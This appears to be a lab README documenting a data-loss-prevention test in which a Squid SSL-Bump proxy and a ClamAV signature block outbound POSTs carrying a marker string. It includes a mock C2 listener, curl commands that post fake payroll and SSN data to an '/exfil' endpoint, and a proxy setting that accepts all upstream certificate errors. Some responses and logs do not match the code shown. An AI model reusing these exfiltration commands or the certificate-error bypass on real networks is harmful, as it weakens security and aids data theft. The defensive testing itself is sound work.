# Outbound TLS Inspection & DLP Validation Pipeline

## Executive Summary
This directory documents the technical implementation and empirical validation of an end-to-end Data Loss Prevention (DLP) pipeline designed to intercept, decrypt, and block unauthorized outbound exfiltration (HTTP/HTTPS POST requests). Operating via an inline OPNsense security gateway, the inspection engine combines Squid SSL-Bump transparent proxying, C-ICAP adaptation (`REQMOD`), and ClamAV custom byte signature pattern-matching to prevent sensitive data egress while permitting benign traffic to an external mock C2 listener.

---

## 1. Test Metadata
* **Egress Source Node:** `WRKSTN-01` (`192.168.10.50`) — Protected LAN Endpoint
* **Inspection Gateway:** `OPNsense 24.x` (`192.168.10.1` LAN / `10.0.2.15` WAN)
* **Target Listener:** Debian VM (`10.0.2.25`) — WAN-side Mock C2 Endpoint
* **Mock Server Implementation:** Python 3 (`http.server` with TLS `SSLContext` wrapping and verbose request/header logging)
* **Inspection Stack:** Squid Proxy (SSL-Bump) + C-ICAP (`srv_clamav`)
* **DLP Engine:** ClamAV Daemon (`clamd`)
* **Custom Signature File:** `/var/db/clamav/custom_dlp.ndb`
* **Custom Detection Rule:** `DLP.Outbound.RestrictedPII`
* **Target Sensitive String:** `CONFIDENTIAL_PAYROLL` (Hex: `434f4e464944454e5449414c5f504159524f4c4c`)
* **Trust Anchor Hierarchy:** `ADCS-Root-CA` $\rightarrow$ `OPNsense-SubCA-Authority` (Installed in Windows Local Machine Store)

---

## 2. Evidence Chain of Custody

| Step | Source System | Evidence File / Artifact | Key Findings |
| --- | --- | --- | --- |
| **01. Cleartext HTTP Benign POST** | `WRKSTN-01, Debian VM` | [http-benign-post-validation.txt](https://www.google.com/search?q=./evidence/http-benign-post-validation.txt) | Executed `curl.exe` over plain HTTP (`:80`); received `200 OK`; Debian listener logged benign payload. |
| **02. Cleartext HTTP DLP Block** | `WRKSTN-01, OPNsense` | [http-dlp-block-validation.txt](https://www.google.com/search?q=./evidence/http-dlp-block-validation.txt) | Executed `curl.exe` containing `CONFIDENTIAL_PAYROLL`; received `403 Forbidden` (`ERR_SEC_ACCESS_DENIED`); 0 bytes reached listener. |
| **03. TLS Handshake & Chain Verification** | `WRKSTN-01, OPNsense` | [openssl-tls-chain-validation.txt](https://www.google.com/search?q=./evidence/openssl-tls-chain-validation.txt) | Verified dynamic leaf certificate generation signed by `OPNsense-SubCA-Authority` linking up to `ADCS-Root-CA` with valid `IP:10.0.2.25` SAN. |
| **04. Encrypted HTTPS Benign POST** | `WRKSTN-01, Debian VM` | [https-ssl-bump-benign-post.txt](https://www.google.com/search?q=./evidence/https-ssl-bump-benign-post.txt) | Transmitted encrypted POST via SSL-Bump; received `200 OK` with `Cache-Status: OPNsense.internal;detail=mismatch`; Debian logged 26-byte payload. |
| **05. Encrypted HTTPS DLP Block** | `WRKSTN-01, OPNsense` | [https-dlp-encrypted-block.txt](https://www.google.com/search?q=./evidence/https-dlp-encrypted-block.txt) | Transmitted encrypted POST containing `CONFIDENTIAL_PAYROLL`; Squid decrypted stream, C-ICAP tripped `DLP.Outbound.RestrictedPII`, returned `403 Forbidden`; 0 bytes leaked. |
| **06. C-ICAP Virus Detection Log** | `OPNsense` | [cicap-virus-scan-log.txt](https://www.google.com/search?q=./evidence/cicap-virus-scan-log.txt) | Inspected `/var/log/c-icap/virus.log`; confirmed signature match `virus: DLP.Outbound.RestrictedPII` from client `192.168.10.50`. |

---

## 3. Deep-Dive Architecture: Inspection Engine & Mock C2 Server

```text
[ WRKSTN-01: 192.168.10.50 ]
       │
       │ (1) Outbound HTTPS POST (Port 443)
       ▼
[ OPNsense Firewall: pf rdr-to ]
       │
       │ (2) Redirected to 127.0.0.1:3129 (SSL-Bump)
       ▼
[ Squid Proxy Core ]
       │ ── (3) Terminates client TLS via Sub-CA
       │ ── (4) Establishes upstream TLS to Python C2 (10.0.2.25)
       │
       │ (5) REQMOD Adaptation (Raw HTTP Request Body)
       ▼
[ C-ICAP Engine (`srv_clamav`) ]
       │
       │ (6) In-Memory Socket Scan
       ▼
[ ClamAV Daemon (`clamd`) ]
       │
       ├─► [MATCH: `DLP.Outbound.RestrictedPII`] ──► 403 Forbidden Page to Client (Egress Severed)
       └─► [NO MATCH] ───────────────────────────► Relayed to Python Mock C2 (200 OK)

```

### The Custom DLP Signature Rule

The detection rule operates as an uncompressed hex pattern match compiled into ClamAV's database:

```text
# Path: /var/db/clamav/custom_dlp.ndb
DLP.Outbound.RestrictedPII:0:*:434f4e464944454e5449414c5f504159524f4c4c

```

* **Format:** `SignatureName:TargetType:Offset:HexPattern`
* **Target Type `0`:** Scans raw byte streams regardless of recognized file headers.
* **Hex String:** Represents ASCII string `CONFIDENTIAL_PAYROLL`.

### Verbose Diagnostic Mock C2 Listener (`c2_listener_verbose.py`)

To isolate proxy behavior, inspect injected proxy headers (such as `X-Forwarded-For`), and diagnose socket framing, the listener logs every request, header key-value pair, payload preview, and stack trace:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl, sys, traceback
from datetime import datetime

class VerboseC2Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def handle_one_request(self):
        try:
            super().handle_one_request()
        except Exception as e:
            print(f"[!] EXCEPTION in handle_one_request: {e}")
            traceback.print_exc()

    def do_GET(self):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{now}] === INCOMING GET ===")
        print(f"Client: {self.client_address}")
        print("--- Headers ---")
        for k, v in self.headers.items():
            print(f"  {k}: {v}")
        print("---------------")
        
        body = b"OK: VERBOSE LISTENER UP\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)
        self.wfile.flush()
        print("[*] 200 response sent successfully.\n")

    def do_POST(self):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{now}] === INCOMING POST ===")
        print(f"Client: {self.client_address}")
        print("--- Headers ---")
        for k, v in self.headers.items():
            print(f"  {k}: {v}")
        print("---------------")
        
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode("utf-8", errors="replace")
        print(f"Payload ({length} bytes):")
        print(f"--- Payload Preview ---\n{data[:150]}\n-----------------------")
        
        body = b"OK: VERBOSE POST RECEIVED\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)
        self.wfile.flush()
        print("[*] 200 response sent successfully.\n")

    def log_message(self, format, *args):
        print(f"[HTTP Log] {self.address_string()} - {format % args}")

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 443), VerboseC2Handler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.load_cert_chain(certfile="/tmp/cert/c2_fullchain.crt", keyfile="/tmp/cert/c2_server.key")
    server.socket = context.wrap_socket(server.socket, server_side=True)
    print("[*] Verbose logging listener running on 0.0.0.0:443...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        sys.exit(0)

```

---

## 4. Protocol Verification & Validation Tests

### Test 1: Plaintext HTTP Verification (Port 80)

Validates base routing, ICAP adaptation, and signature engine efficiency without TLS overhead.

```powershell
# 1. Benign request (Passes)
curl.exe -i -X POST http://10.0.2.25/exfil -d "agent_id=102&status=online"

# 2. Exfiltration attempt (Terminated by Gateway)
curl.exe -i -X POST http://10.0.2.25/exfil -d "CONFIDENTIAL_PAYROLL: EmployeeID=10492, SSN=000-11-2222"

```

* **Observation:** The second request immediately yields `HTTP/1.1 403 Forbidden` from Squid. The Python server terminal prints nothing.

---

### Test 2: Encrypted HTTPS Verification (Port 443)

Validates TLS termination, intermediate chain parsing, dynamic certificate minting, payload decryption, and REQMOD interception.

```powershell
# 1. Benign HTTPS Transaction (Passes)
curl.exe -k -i -X POST https://10.0.2.25/exfil -d "agent_id=102&status=online"

# 2. Encrypted Exfiltration Attempt (Terminated by Gateway)
curl.exe -k -i -X POST https://10.0.2.25/exfil -d "CONFIDENTIAL_PAYROLL: EmployeeID=10492, SSN=000-11-2222"

```

* **Client Output:**
```http
# 1. Benign HTTPS Transaction
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.13.5
Date: Wed, 07 Oct 2026 20:28:40 GMT
Content-Type: text/plain
Content-Length: 22
Cache-Status: OPNsense.internal;detail=mismatch
Connection: keep-alive

OK: TLS POST RECEIVED

# 2. Encrypted Exfiltration Attempt
HTTP/1.1 403 Forbidden
Server: squid
Mime-Version: 1.0
Content-Type: text/html;charset=utf-8
X-Squid-Error: ERR_SEC_ACCESS_DENIED 0

```

* **Target Listener Console (Debian VM):**
```text
# Received Benign POST (26 bytes forwarded through Squid):
[2026-10-07 14:28:40] [EXFIL POST] 26 bytes received:
agent_id=102&status=online

# Sensitive Exfiltration POST:
# [BLOCKED AT GATEWAY] 0 bytes received; session aborted upstream by Squid

```


* **Firewall Log (`/var/log/c-icap/virus.log`):**
```text
Wed Oct 07 13:00:14 2026, reqmod, virus: DLP.Outbound.RestrictedPII, client: 192.168.10.50

```



---

## 5. Operational Considerations & Troubleshooting Runbook

### Python Mock Server `Read Error: [No Error]`

* **Symptom:** Squid completes the TLS handshake to Debian but returns a `Read Error` page to the client.
* **Root Cause:** Standard Python `http.server` handles single requests without explicit HTTP/1.1 response framing. When Squid forwards incoming requests with `Connection: keep-alive` and attempts to read ahead on the pipeline, Python's omission of `Content-Length` causes Squid to wait for EOF. When the raw SSL socket closes without a TLS `close_notify` shutdown alert, Squid treats the incomplete read as a dropped connection.
* **Remediation:** Enforce `protocol_version = "HTTP/1.1"`, calculate and write `Content-Length`, set `Connection: close`, and invoke `self.wfile.flush()`.

### Upstream Certificate Verification (`SQUID_TLS_ERR_CONNECT`)

* **Symptom:** Squid logs `TLS_IO_ERR=1` or `unable to get local issuer certificate`.
* **Root Cause:** Squid’s upstream SSL engine (`sslproxy`) does not automatically inherit GUI authorities without an explicit bundle path, and rejects certificates lacking a SAN IP/DNS entry.
* **Remediation:** Sign the mock C2 certificate using the internal Sub-CA with a SAN extension (`subjectAltName = IP:10.0.2.25`), combine the Sub-CA and Root CA on Debian (`c2_fullchain.crt`), and instruct Squid to reference the authority bundle:
```squid
sslproxy_cafile /var/squid/ssl/ca_bundle.pem
sslproxy_cert_error allow all

```



### Browser Multipart Bypass (`204 No Content`)

* **Symptom:** `curl.exe` POST requests are blocked (403), but browser form uploads pass uninspected.
* **Root Cause:** Browsers transmit uploads as `multipart/form-data` or chunked streams. Default C-ICAP configuration only scans recognized archive/executable extensions, returning `204 No Content` for standard web-form parts.
* **Remediation:** Set `virus_scan.DefaultMode scan` and configure `virus_scan.ScanFileTypes TEXT DATA EXECUTABLE ARCHIVE GRAPHICS ALL` in `/usr/local/etc/c-icap/virus_scan.conf`.

```
